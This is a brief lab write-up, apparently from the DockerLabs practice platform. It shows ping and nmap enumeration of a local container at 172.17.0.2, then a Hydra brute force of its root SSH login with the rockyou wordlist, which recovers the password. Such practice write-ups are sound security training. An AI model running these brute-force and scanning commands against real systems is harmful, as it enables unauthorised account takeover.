# IP
172.17.0.2

# Enumeration
## ICMP
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/trust]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.044 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.060 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1028ms
rtt min/avg/max/mdev = 0.044/0.052/0.060/0.008 ms
```
## Port scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/trust]
└─$ sudo nmap -sV -sC -Pn -n -vvv -p- 172.17.0.2 -o scan.txt
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfOr49bj2kh3ab2WutTu6Jx7NA7OKSxzp42bJU4nqtQlICZbjiBXhOa1ZKOfUfNvXOGEThiSrTNbf1nRGzXtACiZQp+RwQr5ZEYPAOyasC7C29FaIZVURR7FuFea+tfWZjbzDaP8WnA/U3TQHwtUBsNSR3qFscgJQ1niCyrfH/4rbUk5jiLYN6y8NjctGvsvwPE+cCiFVge76qyfzmZdaf5gJT9DKDt47iBkrngCODYrqqt+Bbl9ZEGh5SUfDqYfsFMIvlsSjmbx0HtMc2NhTW7jLtyV3Xm6ynFUZmQRPRqXdzuN5TIhYzaQD8ogC1Hk9sYJJNUMMF+lGVf15iouMn
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLJ77V//dhC1BX2KXpMNurk9hJPA3aukuoMLPajtYfaewmlwrsK5Rdss/I/iQ23YrziNvWb3VMJk511YbvvreZo=
|   256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICFLUqv+frul58FgQLXP91bNrTRC9d1X545DZJ0wsw6z
```
## Brute force
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/breakmyssh]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-09 14:12:20
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-09 14:12:22
```